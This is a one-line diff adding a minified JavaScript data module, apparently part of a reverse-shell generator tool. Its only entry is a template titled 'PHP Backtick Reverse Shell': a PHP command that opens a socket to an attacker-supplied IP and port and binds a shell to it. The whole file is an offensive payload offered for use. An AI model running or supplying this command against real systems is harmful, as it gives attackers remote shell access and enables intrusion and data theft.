@@ -1,0 +1,1 @@
+const e=[{title:"PHP Backtick Reverse Shell",template:"php -r '$sock=fsockopen(\"{ip}\",{port});`sh <&3 >&3 2>&3`;'",description:"PHP one-liner reverse shell using backtick operator."}],t={commands:e};export{e as commands,t as default};
